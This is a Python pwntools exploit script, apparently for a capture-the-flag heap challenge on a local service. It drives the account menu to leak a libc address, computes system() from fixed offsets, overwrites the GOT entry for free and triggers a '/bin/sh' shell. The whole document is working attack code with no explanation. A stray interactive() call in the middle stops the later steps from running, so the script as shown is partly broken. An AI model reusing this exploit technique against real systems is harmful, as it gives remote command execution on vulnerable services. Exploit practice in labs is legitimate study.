from pwn import *
import binascii
 
conn = remote('127.0.0.1', 1337)
 
# make account 0
print conn.recvuntil('Action: ')
conn.sendline('0')
print conn.recvuntil('size of description: ')
conn.sendline('29')
print conn.recvuntil('name: ')
conn.sendline('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
print conn.recvuntil('text length: ')
conn.sendline('24')
print conn.recvuntil('text: ')
conn.sendline('123456789012345678901234')
 
# make account 1
print conn.recvuntil('Action: ')
conn.sendline('0')
print conn.recvuntil('size of description: ')
conn.sendline('29')
print conn.recvuntil('name: ')
conn.sendline('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
print conn.recvuntil('text length: ')
conn.sendline('10')
print conn.recvuntil('text: ')
conn.sendline('12345678')
 
# delete account 0
print conn.recvuntil('Action: ')
conn.sendline('1')
print conn.recvuntil('index: ')
conn.sendline('0')
 
# make account 2
print conn.recvuntil('Action: ')
conn.sendline('0')
print conn.recvuntil('size of description: ')
conn.sendline('80')
print conn.recvuntil('name: ')
conn.sendline('abcdefghijklmnopqrstuvwxyz')
print conn.recvuntil('text length: ')
conn.sendline('180')
print conn.recvuntil('text: ')
conn.sendline('/bin/sh\x00'+'\x10\xb0\x04\x08'*43) # 0x804b010 is the GOT address of free, found using radare2
 
# display account 1
print conn.recvuntil('Action: ')
conn.sendline('2')
print conn.recvuntil('index: ')
conn.sendline('1')
name_line = conn.recvline()
print name_line
description_line = conn.recvline()
free_lib_addr = description_line[13:17]
print 'found leak:', binascii.hexlify(free_lib_addr)
system_lib_addr = p32(u32(free_lib_addr) - 0x760f0 + 0x3e3e0) # use offsets we calculated earlier
print 'system addr:', binascii.hexlify(system_lib_addr)
 
conn.interactive()

# update description for account 1 to overwrite the GOT
print conn.recvuntil('Action: ')
conn.sendline('3')
print conn.recvuntil('index: ')
conn.sendline('1')
print conn.recvuntil('text length: ')
conn.sendline('4')
print conn.recvuntil('text: ')
conn.sendline(system_lib_addr)
 
# delete account 2, hopefully this works?????
print conn.recvuntil('Action: ')
conn.sendline('1')
print conn.recvuntil('index: ')
conn.sendline('2')
 
conn.interactive()

